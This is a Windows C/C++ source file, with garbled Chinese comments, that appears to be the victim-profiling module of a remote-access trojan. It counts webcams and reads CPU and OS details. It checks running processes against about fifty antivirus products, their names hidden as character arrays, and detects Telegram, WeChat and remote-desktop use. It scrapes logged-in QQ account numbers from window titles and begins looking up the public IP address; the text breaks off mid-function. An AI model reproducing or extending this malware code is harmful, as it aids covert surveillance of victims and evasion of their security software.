
//ö����Ƶ�豸
//////////////////////////////////////////////////////////
/*************�ж���Ƶ��ͷ�ļ�*******************/
#include <strmif.h>
#include <uuids.h>
#pragma comment(lib, "strmiids.lib")
#include <windows.h>    
#include "psapi.h"    
#include"stdio.h"  
#include <tlhelp32.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ws2_32.lib")

extern char ConnetPass[20];
extern BOOL MyDele_zc;	 // �Ƿ�Ϊ��ɫ��װ
extern BOOL MyFct;  //������͸
/**********************************/
UINT EnumDevices()
{
	HINSTANCE Ole32 = LoadLibrary("Ole32.dll"); 
	
    typedef void (WINAPI *TCoInitialize)(LPVOID ); 
    TCoInitialize MyCoInitialize = (TCoInitialize)GetProcAddress(Ole32, "CoInitialize");

    typedef void (WINAPI *TCoUninitialize)(void ); 
    TCoUninitialize MyCoUninitialize = (TCoUninitialize)GetProcAddress(Ole32, "CoUninitialize");

    typedef HRESULT (WINAPI *TCoCreateInstance)(IN REFCLSID , IN LPUNKNOWN ,IN DWORD , IN REFIID , OUT LPVOID FAR* ); 
	
    TCoCreateInstance MyCoCreateInstance = (TCoCreateInstance)GetProcAddress(Ole32, "CoCreateInstance");

	HINSTANCE Oleaut32 = LoadLibrary("Oleaut32.dll"); 

    typedef void (WINAPI *TSysFreeString)(BSTR ); 
    TSysFreeString MySysFreeString = (TSysFreeString)GetProcAddress(Oleaut32, "SysFreeString");

	MyCoInitialize(NULL);    //COM ���ʼ��
	UINT nCam = 0;
	/////////////////////    Step1        /////////////////////////////////
	//ö�ٲ����豸
	ICreateDevEnum *pCreateDevEnum;                          //�����豸ö����
	//�����豸ö�ٹ�����
	HRESULT hr = MyCoCreateInstance(CLSID_SystemDeviceEnum,    //Ҫ������Filter��Class ID
		NULL,                                                //��ʾFilter�����ۺ�
		CLSCTX_INPROC_SERVER,                                //����������COM����
		IID_ICreateDevEnum,                                  //��õĽӿ�ID
		(void**)&pCreateDevEnum);                            //�����Ľӿڶ����ָ��
	if (hr != NOERROR)
	{
		return FALSE;
	}
	/////////////////////    Step2        /////////////////////////////////
	IEnumMoniker *pEm;                 //ö�ټ�����ӿ�
	//��ȡ��Ƶ���ö����
	hr = pCreateDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEm, 0);
	if (hr != NOERROR)
	{
		return FALSE;
	}
	/////////////////////    Step3        /////////////////////////////////
	pEm->Reset();                                            //����ö������λ
	ULONG cFetched;
	IMoniker *pM;                                            //������ӿ�ָ��
	while(hr = pEm->Next(1, &pM, &cFetched), hr==S_OK)       //��ȡ��һ���豸
	{
		IPropertyBag *pBag;                                  //����ҳ�ӿ�ָ��
		hr = pM->BindToStorage(0, 0, IID_IPropertyBag, (void **)&pBag);
		//��ȡ�豸����ҳ
		if(SUCCEEDED(hr)) 
		{
            VARIANT var;
            var.vt = VT_BSTR;                                //������Ƕ���������
            hr = pBag->Read(L"FriendlyName", &var, NULL);
			//��ȡFriendlyName��ʽ����Ϣ
            if (hr == NOERROR) 
            {
				nCam++;
				MySysFreeString(var.bstrVal);   //�ͷ���Դ���ر�Ҫע��
            }
            pBag->Release();                  //�ͷ�����ҳ�ӿ�ָ��
        }
        pM->Release();                        //�ͷż�����ӿ�ָ��
    }
	MyCoUninitialize();                   //ж��COM��

	if (Ole32)
		FreeLibrary(Ole32);

	if (Oleaut32)
		FreeLibrary(Oleaut32);
	
	return nCam;
}

void CPUClockMhzt(char *cTemp)
{
	char  dwCPUMhz[10]={0};
	ReadRegEx(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",  "~MHz", REG_DWORD, (char *)dwCPUMhz, NULL, sizeof(DWORD), 0);
	SYSTEM_INFO siSysInfo; 
	//����Ӳ����Ϣ��SYSTEM_INFO�ṹ����
	m_gFunc.GetSystemInfo(&siSysInfo); 	

	m_gFunc.wsprintfA(cTemp, "%d*%sMHz", siSysInfo.dwNumberOfProcessors,dwCPUMhz);
	
	return;
}

extern char MyServiceName[70];
void GetHostRemark(LPTSTR lpBuffer, UINT uSize ,LPTSTR strSubKey)
{
	m_gFunc.memset(lpBuffer, 0, uSize);
	ReadRegEx(HKEY_CURRENT_USER, strSubKey,"Remark", REG_SZ, lpBuffer, NULL,uSize, 0);

	if (lstrlen(lpBuffer) == 0)
		m_gFunc.gethostname(lpBuffer, uSize);
}

void GetInstllTime(LPTSTR lpBuffer, UINT uSize , LPTSTR strSubKey)
{
	m_gFunc.memset(lpBuffer, 0, uSize);
	ReadRegEx(HKEY_CURRENT_USER, strSubKey,"InstallTime", REG_SZ, lpBuffer, NULL,uSize, 0);
	
	if (lstrlen(lpBuffer) == 0)
		lstrcpy(lpBuffer,"��ȡʧ��");
}

//////////////////////////ϵͳ�汾begin
BOOL IsWindows64()
{
	typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
	LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS)::GetProcAddress(GetModuleHandle("kernel32.dll"), "IsWow64Process");
	BOOL bIsWow64 = FALSE;
	if (fnIsWow64Process)
		if (!fnIsWow64Process(::m_gFunc.GetCurrentProcess(), &bIsWow64))
			bIsWow64 = FALSE;
		return bIsWow64;
}

BOOL GetNtVersionNumbers(DWORD&dwMajorVer, DWORD& dwMinorVer,DWORD& dwBuildNumber)
{
    BOOL bRet= FALSE;
    HMODULE hModNtdll= NULL;
    if (hModNtdll= ::LoadLibrary("ntdll.dll"))
    {
        typedef void (WINAPI *pfRTLGETNTVERSIONNUMBERS)(DWORD*,DWORD*, DWORD*);
        pfRTLGETNTVERSIONNUMBERS pfRtlGetNtVersionNumbers;
        pfRtlGetNtVersionNumbers = (pfRTLGETNTVERSIONNUMBERS)::GetProcAddress(hModNtdll, "RtlGetNtVersionNumbers");
        if (pfRtlGetNtVersionNumbers)
        {
			pfRtlGetNtVersionNumbers(&dwMajorVer, &dwMinorVer,&dwBuildNumber);
			dwBuildNumber&= 0x0ffff;
			bRet = TRUE;
        }
        ::FreeLibrary(hModNtdll);
        hModNtdll = NULL;
    }
    return bRet;
}
//////////////////////////ϵͳ�汾end
char* GetVirus()
{		
	char RNykS[] = {'3','6','0','t','r','a','y','.','e','x','e','\0'}; //360��ȫ��ʿ
	
	char lPIwz[] = {'a','v','p','.','e','x','e','\0'}; //����˹��
	
	char faUnK[] = {'K','v','M','o','n','X','P','.','e','x','e','\0'}; //����ɱ��
	
	char RkWMC[] = {'R','a','v','M','o','n','D','.','e','x','e','\0'}; //����ɱ��
	
	char ygrrh[] = {'3','6','0','s','d','.','e','x','e','\0'}; //360ɱ��
	
	char cuuPs[] = {'M','i','n','e','r','.','e','x','e','\0'}; //������ʯ
	
	char muFHe[] = {'e','g','u','i','.','e','x','e','\0'}; //NOD32
	
	char XitKI[] = {'k','x','e','t','r','a','y','.','e','x','e','\0'}; //��ɽ����
	
	char uayGU[] = {'T','M','B','M','S','R','V','.','e','x','e','\0'}; //����ɱ��
	
	char RfVvj[] = {'a','v','g','u','i','.','e','x','e','\0'}; //AVG
	
	char AadTj[] = {'a','s','h','D','i','s','p','.','e','x','e','\0'}; //AVAST
	
	char NYiVD[] = {'M','P','M','O','N','.','E','X','E','\0'};//΢����������
	
	char UfYcW[] = {'a','v','c','e','n','t','e','r','.','e','x','e','\0'};//С��ɡ
	
	char cLMsc[] = {'s','p','i','d','e','r','n','t','.','e','x','e','\0'};//Dr.web
	
	char ezWYd[] = {'M','c','s','h','i','e','l','d','.','e','x','e','\0'};//Mcafee
	
	char vVsVA[] = {'f','-','s','e','c','u','r','e','.','e','x','e','\0'};//����
	
	char ybBAI[] = {'a','r','c','a','v','i','r','.','e','x','e','\0'};//Arcavir
	
	char UVHhd[] = {'c','c','S','v','c','H','s','t','.','e','x','e','\0'};//ŵ��ɱ��
	
	char kZhtw[] = {'k','s','a','f','e','.','e','x','e','\0'};//��ɽ��ʿ
	
	char ZzeaS[] = {'a','u','t','h','f','w','.','e','x','e','\0'};//Authentium
	
	char mALkC[] = {'v','s','s','e','r','v','.','e','x','e','\0'};//BitDefender
	
	char TfBKG[] = {'a','g','e','n','t','.','e','x','e','\0'};//��������
	
	char iGtsy[] = {'c','f','p','.','e','x','e','\0'};//COMODO
	
	char xeAhK[] = {'F','-','P','R','O','T','.','e','x','e','\0'};//F-Port
	
	char uYhlH[] = {'g','u','a','r','d','x','s','e','r','v','i','c','e','.','e','x','e','\0'};//Ikarus
	
	char WeCIV[] = {'m','s','s','e','c','e','s','s','.','e','x','e','\0'};//MSE
	
	char fuJsh[] = {'V','3','S','v','c','.','e','x','e','\0'};//����ʿV3
	
	char fwwgf[] = {'r','e','m','u','p','d','.','e','x','e','\0'};//��è��ʿ
	
	char sVgBo[] = {'a','l','m','o','n','.','e','x','e','\0'};//Sophos
	
	char gGNhq[] = {'A','P','A','S','S','e','r','v','.','e','x','e','\0'};//Sunbelt
	
	char bTJJi[] = {'F','o','r','t','i','T','r','a','y','.','e','x','e','\0'};//����
	
	char SLboS[] = {'N','V','C','S','c','h','e','d','.','e','x','e','\0'};//Norman
	
	char zbDaI[] = {'Q','Q','P','C','R','T','P','.','e','x','e','\0'};//QQ���Թܼ�
	
	char igiXx[] = {'B','a','i','d','u','S','d','S','v','c','.','e','x','e','\0'};//�ٶ�ɱ��
	
	char IosUG[] = {'q','q','.','E','X','E','\0'};//QQ
	
	char WaAUL[] = {'y','y','.','e','x','e','\0'};//YY
	
	char DnoFe[] = {'9','1','5','8','.','E','X','E','\0'};//9158
	
	char AmXYX[] = {'C','a','m','f','r','o','g',' ','V','i','d','e','o',' ','C','h','a','t','.','e','x','e','\0'};//CVC
	
	char CvbAi[] = {'m','s','t','s','c','.','E','X','E','\0'};//Զ������
	
	char kzncF[] = {'A','l','i','I','M','.','e','x','e','\0'};//��������
	
	char AkFoK[] = {'D','U','B','r','u','t','e','.','e','x','e','\0'};//DUB
	
	char eRmlH[] = {'N','s','v','m','o','n','.','n','p','c','\0'};//Naver
	
	char YSsNg[] = {'k','n','s','d','t','r','a','y','.','e','x','e','\0'};//��ţɱ��
	
	char YTKzh[] = {'s','.','e','x','e','\0'};//��׽��
	
	char nWrkK[] = {'F','T','P','.','e','x','e','\0'};//����FTP
	
	char lmSkz[] = {'S','e','r','v','U','D','a','e','m','o','n','.','e','x','e','\0'};//����S-U
	
	char SRKAz[] = {'1','4','3','3','.','e','x','e','\0'};//��ɨ1433
	
	char HpGdR[] = {'p','a','t','r','a','y','.','e','x','e','\0'};//����ʿ
	
	char kgTtp[] = {'c','c','S','e','t','M','g','r','.','e','x','e','\0'};//��������
	
	char uxttr[] = {'Q','U','H','L','P','S','V','C','.','E','X','E','\0'};//Quick Heal
	
	char CKnaH[] = {'s','a','f','e','d','o','g','.','e','x','e','\0'};//��ȫ��
	
	char* AllName = "";
	//360��ʿ						����˹��			����ɱ��
	char* VirusName = RNykS;   char* VirusName1 = lPIwz; char* VirusName2 = faUnK;
	//����									360ɱ��					NOD32	
	char* VirusName3 = RkWMC;  char* VirusName4 = ygrrh; char* VirusName5 = cuuPs;
	//NOD32								��ɽ����						΢��
	char* VirusName6 = muFHe;  char* VirusName7 = XitKI; char* VirusName8 = NYiVD;
	//����  								Avira						Avast
	char* VirusName9 = uayGU;  char* VirusName10 = UfYcW; char* VirusName11 = AadTj;
    //Dr.WEB                              �󿧷�                       F-secure
	char* VirusName12 = cLMsc; char* VirusName13 = ezWYd; char* VirusName14 = vVsVA;
	//��ɽ��ʿ								Arcavir                    ŵ��ɱ��
	char* VirusName15 = kZhtw; char* VirusName16 = ybBAI; char* VirusName17 = UVHhd;
	//Authentium                           AVG                        BitDefender
	char* VirusName18 = ZzeaS; char* VirusName19 = RfVvj; char* VirusName20 = mALkC;
	//��������                         Comodo                        F-PROT
	char* VirusName21 = TfBKG; char* VirusName22 = iGtsy; char* VirusName23 = xeAhK;
	//Ikarus                          ΢��ɱ��						����ʿV3 
	char* VirusName24 = uYhlH; char* VirusName25 = WeCIV; char* VirusName26 = fuJsh;
	//��è��ʿ                         Sophos                   Sunbelt  
	char* VirusName27 = fwwgf; char* VirusName28 = sVgBo; char* VirusName29 = gGNhq;
	//����                                        Norman                  QQ��ȫ�ܼ� 
	char* VirusName30 = bTJJi; char* VirusName31 = SLboS; char* VirusName32 = zbDaI;
	//�ٶ�ɱ��							QQ							YY
    char* VirusName33 = igiXx; char* VirusName34 = IosUG; char* VirusName35 = WaAUL;
	//9158								CVC							Զ������
	char* VirusName36 = DnoFe; char* VirusName37 = AmXYX; char* VirusName38 = CvbAi;
	//��������							DUB                         Naver ɱ��
	char* VirusName39 = kzncF; char* VirusName40 = AkFoK; char* VirusName41 = eRmlH;
    //��ţɱ��                        ��ץ��						����S-U
	char* VirusName42 = YSsNg; char* VirusName43 = YTKzh; char* VirusName44 = lmSkz;
	//��ɨ1433							FTP							����ʿ
	char* VirusName45 = SRKAz; char* VirusName46 = nWrkK; char* VirusName47 = HpGdR;
	//��������							Quick Heal					��ȫ��
	char* VirusName48 = kgTtp; char* VirusName49 = uxttr; char* VirusName50 = CKnaH;
     ZeroMemory( AllName, sizeof(AllName) );
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	if (GetProcessID(VirusName)) 
	{
//		OutputDebugString( "����360��ȫ��ʿ��" );
		ZeroMemory( VirusName, sizeof(VirusName) );
		VirusName = "360��ȫ��ʿ";
		m_gFunc.lstrcatA( AllName, VirusName ); // ����ҵ��˽���, �Ͱ����ּӵ�AllName�ĺ���
		m_gFunc.lstrcatA( AllName, " " ); // ��һ�� ����, ��������б��ɱ��.
	}
	if (GetProcessID(VirusName1))
	{	
		ZeroMemory( VirusName1, sizeof(VirusName1) );
		VirusName1 = "����˹��";
		m_gFunc.lstrcatA( AllName, VirusName1 ); 
		m_gFunc.lstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName2))
	{	
		ZeroMemory( VirusName2, sizeof(VirusName2) );
		VirusName2 = "����";
		m_gFunc.lstrcatA( AllName, VirusName2 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName3))
	{	
		ZeroMemory( VirusName3, sizeof(VirusName3) );
		VirusName3 = "����";
		m_gFunc.lstrcatA( AllName, VirusName3 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName4))
	{	
		ZeroMemory( VirusName4, sizeof(VirusName4) );
		VirusName4 = "360ɱ��";
		m_gFunc.lstrcatA( AllName, VirusName4 );
		m_gFunc.lstrcatA( AllName, " " );
	}
		if (GetProcessID(VirusName5))
	{	
		ZeroMemory( VirusName5, sizeof(VirusName5) );
		VirusName5 = "������ʯ";
		m_gFunc.lstrcatA( AllName, VirusName5 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName6))
	{	
		ZeroMemory( VirusName6, sizeof(VirusName6) );
		VirusName6 = "NOD32";
		m_gFunc.lstrcatA( AllName, VirusName6 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName7))
	{	
		ZeroMemory( VirusName7, sizeof(VirusName7) );
		VirusName7 = "��ɽ����";
		m_gFunc.lstrcatA( AllName, VirusName7 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName8))
	{	
		ZeroMemory( VirusName8, sizeof(VirusName8) );
		VirusName8 = "΢��";
		m_gFunc.lstrcatA( AllName, VirusName8 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName9))
	{	
		ZeroMemory( VirusName9, sizeof(VirusName9) );
		VirusName9 = "����";
		m_gFunc.lstrcatA( AllName, VirusName9 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	
	if (GetProcessID(VirusName10))
	{	
		ZeroMemory( VirusName10, sizeof(VirusName10) );
		VirusName10 = "Avira";
		m_gFunc.lstrcatA( AllName, VirusName10 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName11))
	{	
		ZeroMemory( VirusName11, sizeof(VirusName11) );
		VirusName11 = "Avast";
		m_gFunc.lstrcatA( AllName, VirusName11 );
		m_gFunc.lstrcatA( AllName, " " );
	}

	if (GetProcessID(VirusName12))
	{	
		ZeroMemory( VirusName12, sizeof(VirusName12) );
		VirusName12 = "Dr.WEB";
		m_gFunc.lstrcatA( AllName, VirusName12 );
		m_gFunc.lstrcatA( AllName, " " );
	}

	if (GetProcessID(VirusName13))
	{	
		ZeroMemory( VirusName13, sizeof(VirusName13) );
		VirusName13 = "McAfee";
		m_gFunc.lstrcatA( AllName, VirusName13 );
		m_gFunc.lstrcatA( AllName, " " );
	}

	if (GetProcessID(VirusName14))
	{	
		char xHKLM[] = {'F','-','s','e','c','u','r','e','\0'};
		ZeroMemory( VirusName14, sizeof(VirusName14) );
		VirusName14 = xHKLM;
		m_gFunc.lstrcatA( AllName, VirusName14 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName15))
	{	
		ZeroMemory( VirusName15, sizeof(VirusName15) );
		VirusName15 = "��ɽ��ʿ";
		m_gFunc.lstrcatA( AllName, VirusName15 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName16))
	{	
		ZeroMemory( VirusName16, sizeof(VirusName16) );
		VirusName16 = "Arcavir";
		m_gFunc.lstrcatA( AllName, VirusName16 );
		m_gFunc.lstrcatA( AllName, " " );
	}

	if (GetProcessID(VirusName17))
	{	
		ZeroMemory( VirusName17, sizeof(VirusName17) );
		VirusName17 = "ŵ��";
		m_gFunc.lstrcatA( AllName, VirusName17 );
		m_gFunc.lstrcatA( AllName, " " );
	}

	if (GetProcessID(VirusName18))
	{	
		ZeroMemory( VirusName18, sizeof(VirusName18) );
		VirusName18 = "Authentium";
		m_gFunc.lstrcatA( AllName, VirusName18 );
		m_gFunc.lstrcatA( AllName, " " );
	}

	if (GetProcessID(VirusName19))
	{	
		ZeroMemory( VirusName19, sizeof(VirusName19) );
		VirusName19 = "AVG";
		m_gFunc.lstrcatA( AllName, VirusName19 );
		m_gFunc.lstrcatA( AllName, " " );
	}

	if (GetProcessID(VirusName20))
	{	
		ZeroMemory( VirusName20, sizeof(VirusName20) );
		VirusName20 = "BitDefender";
		m_gFunc.lstrcatA( AllName, VirusName20 );
		m_gFunc.lstrcatA( AllName, " " );
	}

	if (GetProcessID(VirusName21))
	{	
		ZeroMemory( VirusName21, sizeof(VirusName21) );
		VirusName21 = "��������";
		m_gFunc.lstrcatA( AllName, VirusName21 );
		m_gFunc.lstrcatA( AllName, " " );
	}

	if (GetProcessID(VirusName22))
	{		
		char Ivneq[] = {'C','o','m','o','d','o','\0'};
		ZeroMemory( VirusName22, sizeof(VirusName22) );
		VirusName22 = Ivneq;
		m_gFunc.lstrcatA( AllName, VirusName22 );
		m_gFunc.lstrcatA( AllName, " " );
	}

	if (GetProcessID(VirusName23))
	{	
		char CzEcJ[] = {'F','-','P','R','O','T','\0'};
		ZeroMemory( VirusName23, sizeof(VirusName23) );
		VirusName23 = CzEcJ;
		m_gFunc.lstrcatA( AllName, VirusName23 );
		m_gFunc.lstrcatA( AllName, " " );
	}

	if (GetProcessID(VirusName24))
	{	
		char AuVDl[] = {'I','k','a','r','u','s','\0'};
		ZeroMemory( VirusName24, sizeof(VirusName24) );
		VirusName24 = AuVDl;
		m_gFunc.lstrcatA( AllName, VirusName24 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	
	if (GetProcessID(VirusName25))
	{	
		ZeroMemory( VirusName25, sizeof(VirusName25) );
		VirusName25= "MSE";
		m_gFunc.lstrcatA( AllName, VirusName25 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	
	if (GetProcessID(VirusName26))
	{	
		ZeroMemory( VirusName26, sizeof(VirusName26) );
		VirusName26= "����ʿV3";
		m_gFunc.lstrcatA( AllName, VirusName26 );
		m_gFunc.lstrcatA( AllName, " " );
	}

	if (GetProcessID(VirusName27))
	{	
		ZeroMemory( VirusName27, sizeof(VirusName27) );
		VirusName27= "��è��ʿ";
		m_gFunc.lstrcatA( AllName, VirusName27 );
		m_gFunc.lstrcatA( AllName, " " );
	}

	if (GetProcessID(VirusName28))
	{	
		char kDCAx[] = {'S','o','p','h','o','s','\0'};
		ZeroMemory( VirusName28, sizeof(VirusName28) );
		VirusName28= kDCAx;
		m_gFunc.lstrcatA( AllName, VirusName28 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	
	if (GetProcessID(VirusName29))
	{	
		ZeroMemory( VirusName29, sizeof(VirusName29) );
		VirusName29= "Sunbelt";
		m_gFunc.lstrcatA( AllName, VirusName29 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	
	if (GetProcessID(VirusName30))
	{	
		ZeroMemory( VirusName30, sizeof(VirusName30) );
		VirusName30= "����";
		m_gFunc.lstrcatA( AllName, VirusName30 );
		m_gFunc.lstrcatA( AllName, " " );
	}

	if (GetProcessID(VirusName31))
	{	
		char XOAQy[] = {'N','o','r','m','a','n','\0'};
		ZeroMemory( VirusName31, sizeof(VirusName31) );
		VirusName31= XOAQy;
		m_gFunc.lstrcatA( AllName, VirusName31 );
		m_gFunc.lstrcatA( AllName, " " );
	}

	if (GetProcessID(VirusName32))
	{	
		ZeroMemory( VirusName32, sizeof(VirusName32) );
		VirusName32= "QQ�ܼ�";
		m_gFunc.lstrcatA( AllName, VirusName32 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName33))
	{	
		ZeroMemory( VirusName33, sizeof(VirusName33) );
		VirusName33 = "�ٶ�ɱ��";
		m_gFunc.lstrcatA( AllName, VirusName33 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName34))
	{	
		ZeroMemory( VirusName34, sizeof(VirusName34) );
		VirusName34 = "QQ";
		m_gFunc.lstrcatA( AllName, VirusName34 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName35))
	{	
		ZeroMemory( VirusName35, sizeof(VirusName35) );
		VirusName35 = "YY";
		m_gFunc.lstrcatA( AllName, VirusName35 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName36))
	{	
		ZeroMemory( VirusName36, sizeof(VirusName36) );
		VirusName36 = "9158";
		m_gFunc.lstrcatA( AllName, VirusName36 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName37))
	{	
		ZeroMemory( VirusName37, sizeof(VirusName37) );
		VirusName37 = "CVC";
		m_gFunc.lstrcatA( AllName, VirusName37 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName38))
	{	
		ZeroMemory( VirusName38, sizeof(VirusName38) );
		VirusName38 = "Զ������";
		m_gFunc.lstrcatA( AllName, VirusName38 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName39))
	{	
		ZeroMemory( VirusName39, sizeof(VirusName39) );
		VirusName39 = "��������";
		m_gFunc.lstrcatA( AllName, VirusName39 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName40))
	{	
		ZeroMemory( VirusName40, sizeof(VirusName40) );
		VirusName40 = "DUB";
		m_gFunc.lstrcatA( AllName, VirusName40 );
		m_gFunc.lstrcatA( AllName, " " );
	}
		if (GetProcessID(VirusName41))
	{	
		ZeroMemory( VirusName41, sizeof(VirusName41) );
		VirusName41 = "Naver";
		m_gFunc.lstrcatA( AllName, VirusName41 );
		m_gFunc.lstrcatA( AllName, " " );
	}
		if (GetProcessID(VirusName42))
	{	
		ZeroMemory( VirusName42, sizeof(VirusName42) );
		VirusName42 = "��ţɱ��";
		m_gFunc.lstrcatA( AllName, VirusName42 );
		m_gFunc.lstrcatA( AllName, " " );
	}
		if (GetProcessID(VirusName43))
	{	
		ZeroMemory( VirusName43, sizeof(VirusName43) );
		VirusName43 = "��׽��";
		m_gFunc.lstrcatA( AllName, VirusName43 );
		m_gFunc.lstrcatA( AllName, " " );
	}
		if (GetProcessID(VirusName44))
	{	
		ZeroMemory( VirusName44, sizeof(VirusName44) );
		VirusName44 = "����S-U";
		m_gFunc.lstrcatA( AllName, VirusName44 );
		m_gFunc.lstrcatA( AllName, " " );
	}
		if (GetProcessID(VirusName45))
	{	
		ZeroMemory( VirusName45, sizeof(VirusName45) );
		VirusName45 = "��ɨ1433";
		m_gFunc.lstrcatA( AllName, VirusName45 );
		m_gFunc.lstrcatA( AllName, " " );
	}
		if (GetProcessID(VirusName46))
	{	
		ZeroMemory( VirusName46, sizeof(VirusName46) );
		VirusName46 = "����FTP";
		m_gFunc.lstrcatA( AllName, VirusName46 );
		m_gFunc.lstrcatA( AllName, " " );
	}
		if (GetProcessID(VirusName47))
	{	
		ZeroMemory( VirusName47, sizeof(VirusName47) );
		VirusName47 = "����ʿ";
		m_gFunc.lstrcatA( AllName, VirusName47 );
		m_gFunc.lstrcatA( AllName, " " );
	}
		if (GetProcessID(VirusName48))
	{	
		ZeroMemory( VirusName48, sizeof(VirusName48) );
		VirusName48 = "��������";
		m_gFunc.lstrcatA( AllName, VirusName48 );
		m_gFunc.lstrcatA( AllName, " " );
	}
		if (GetProcessID(VirusName49))
	{	
		ZeroMemory( VirusName49, sizeof(VirusName49) );
		VirusName49 = "Quick Heal";
		m_gFunc.lstrcatA( AllName, VirusName49 );
		m_gFunc.lstrcatA( AllName, " " );
	}
		if (GetProcessID(VirusName50))
	{	
		ZeroMemory( VirusName50, sizeof(VirusName50) );
		VirusName50 = "��ȫ��";
		m_gFunc.lstrcatA( AllName, VirusName50 );
		m_gFunc.lstrcatA( AllName, " " );
	}
		if (m_gFunc.strstr(AllName, " " )  == 0 )
	{	
		m_gFunc.lstrcatA(AllName , "δ���� ");
	}

	return AllName;
}
////////////////////////////////////////////TG

typedef struct
{
	char *Course;
	char *Name;
} 
AYSDFEE;
AYSDFEE g_AntiVirus_Dataaa[91] = 
{
	{"Telegram.exe",    "TG"},
	{"  ",    "  "}
};

char* ssddd()
{
	static char AllName[1024];
	int t = 0;
	memset(AllName, 0, sizeof(AllName));
	while (1)
	{
		if (strstr(g_AntiVirus_Dataaa[t].Course, " ") == 0)
		{
			if (GetProcessID(g_AntiVirus_Dataaa[t].Course))
			{
				lstrcat(AllName, g_AntiVirus_Dataaa[t].Name);
				lstrcat(AllName, " ");
			}
		}
		else
			break;
		t++;
	}
	
	if (strstr(AllName, " ") == 0)
	{
		lstrcat(AllName, "δ��¼TG");
	}
	
	return AllName;
}
////////////////////////////////////////////TG

////////////////////////////////////////////΢��
typedef struct
{
	char *Course;
	char *Name;
}AYSDFFFE;

AYSDFFFE g_AntiVirus_Dataa[91] =
{
	{"WeChat.exe",    "΢��"},
	{"WXWork.exe",      "��ҵ΢��"},
	{"  ",    "  "}
};

char* ssdddd()
{
	static char AllName[1024];
	int t = 0;
	memset(AllName, 0, sizeof(AllName));
	while (1)
	{
		if (strstr(g_AntiVirus_Dataa[t].Course, " ") == 0)
		{
			if (GetProcessID(g_AntiVirus_Dataa[t].Course))
			{
				lstrcat(AllName, g_AntiVirus_Dataa[t].Name);
				lstrcat(AllName, " ");
			}
		}
		else
			break;
		t++;
	}
	
	if (strstr(AllName, " ") == 0)
	{
		lstrcat(AllName, "δ��¼΢��");
	}
	
	return AllName;
}
/////////////////
void clean_string(char *str)//ȥ��β�ո�
{
	char *start = str - 1;
	char *end = str;
	char *p = str;
	while(*p)
	{
		switch(*p)
		{
		case ' ':
		case '\r':
		case '\n':
			{
				if(start + 1==p)
					start = p;
			}
			break;
		default:
			break;
		}
		++p;
	}
	//�����������ַ�����β�� ������ǰ
	--p;
	++start;
	if(*start == 0)
	{
		//�Ѿ����ַ�����ĩβ�� 
		*str = 0 ;
		return;
	}
	end = p + 1;
	while(p > start)
	{
		switch(*p)
		{
		case ' ':
		case '\r':
		case '\n':
			{
				if(end - 1 == p)
					end = p;
			}
			break;
		default:
			break;
		}
		--p;
	}
	memmove(str,start,end-start);
	*(str + (int)end - (int)start) = 0;
}
char * GetQQ()
{
	char QQ[MAX_PATH] = {0};
	char szText[MAX_PATH] = "CTXOPConntion_Class";
    char szQQNumber[MAX_PATH] = {0};
    HWND hWnd = FindWindow(szText, NULL);
    while (hWnd)
    {
		if(m_gFunc.strcmp(szText,"CTXOPConntion_Class")==0)
		{
			GetWindowText(hWnd, szText, MAX_PATH);
			int len = m_gFunc.strlen(szText);
			do
			{
				len--;
			} while (szText[len] != '_');
			strcpy(szQQNumber, &szText[len+1]);
			strcat(QQ,szQQNumber);
			strcat(QQ," ");
		}
		hWnd=GetWindow(hWnd,GW_HWNDNEXT);
		GetClassName(hWnd,szText,MAX_PATH);
    }
	m_gFunc.CloseHandle(hWnd);
	clean_string(QQ);
	if (m_gFunc.strlen(QQ) > 4)
		return QQ;
	else
		return "NULL";
}
//////������͸
BOOL GetWanIPAddress(IN_ADDR *IPAddress)
{
	char szUrl[] = {'h','t','t','p',':','/','/','w','w','w','.','t','a','o','b','a','o','.','c','o','m','/','h','e','l','p','/','g','e','t','i','p','.','p','h','p','\0'};
	HINTERNET hInternet;
	HINTERNET hHttpFile;
	char *szHttpBuffer;
	DWORD dwHttpBufferLen;
	DWORD dwBytesRead;
	char *ip_start;
	char *ip_stop;
	hInternet = InternetOpenA(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hInternet == NULL)
		return FALSE;
	hHttpFile = InternetOpenUrlA(hInternet, szUrl, NULL, 0, INTERNET_FLAG_RELOAD, NULL);
	if (hHttpFile == NULL)
	{
		InternetCloseHandle(hInternet);
		return FALSE;
	}
	if (!InternetQueryDataAvailable(hHttpFile, &dwHttpBufferLen, 0, 0))
	{
